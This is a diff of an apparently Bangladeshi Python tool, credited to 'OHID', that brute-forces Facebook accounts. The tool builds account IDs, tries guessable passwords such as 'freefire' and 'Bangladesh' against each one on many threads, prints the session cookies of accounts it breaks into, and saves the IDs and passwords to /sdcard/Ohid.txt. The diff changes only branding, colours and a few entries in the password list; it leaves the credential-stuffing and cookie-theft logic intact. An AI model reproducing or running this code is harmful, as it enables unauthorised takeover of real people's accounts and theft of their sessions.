@@ -1,6 +1,6 @@
 #--------------++CREATED     +OHID++-----------------#
 #--------------++FACEBOOK  + OHID++----------------#
-#--------------++ GITHUB        + DX1433+--------------------------#
+#--------------++ GITHUB        + OHID+--------------------------#
 
 import os
 os.system("pip uninstall requests -y")
@@ -36,7 +36,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python Cyber.py')
+        os.system('python Update.py')
 
 
 os.system('xdg-open https://www.facebook.com/profile.php?id=100092954297396&mibextid=vPdvX0B5T65af74v')
@@ -64,14 +64,14 @@ def randBuildLSB():
     return ua
 
 
-logo=(f'''{B}\033[0;92m
+logo=(f'''{B}
 
-╭━━━┳╮╱╭┳━━┳━━━╮
-┃╭━╮┃┃╱┃┣┫┣┻╮╭╮┃
-┃┃╱┃┃╰━╯┃┃┃╱┃┃┃┃
-┃┃╱┃┃╭━╮┃┃┃╱┃┃┃┃
-┃╰━╯┃┃╱┃┣┫┣┳╯╰╯┃
-╰━━━┻╯╱╰┻━━┻━━━╯
+\033[1;33m╭━━━┳╮╱╭┳━━┳━━━╮
+\033[1;33m┃╭━╮┃┃╱┃┣┫┣┻╮╭╮┃
+\033[1;33m┃┃╱┃┃╰━╯┃┃┃╱┃┃┃┃
+\033[1;33m┃┃╱┃┃╭━╮┃┃┃╱┃┃┃┃
+\033[1;33m┃╰━╯┃┃╱┃┣┫┣┳╯╰╯┃
+\033[1;33m╰━━━┻╯╱╰┻━━┻━━━╯
                                                                                          
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
@@ -133,7 +133,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','freefire','Bangladesh','i love you']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'728027','freefire','Bangladesh','iloveu']
             Tara.submit(method_crack,ids,passlist)
     linex()
     print(' THE PROGRESS HAS BEEN COMPLETE ')
@@ -166,7 +166,7 @@ def method_crack(ids,passlist):
                 else:
                     print('\r\r \033[1;32m[OHID-ok] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;37m [COOKIE-🌸] '+coki)
+                    print('\033[1;35m [COOKIE-🌸] '+coki)
                     open('/sdcard/Ohid.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
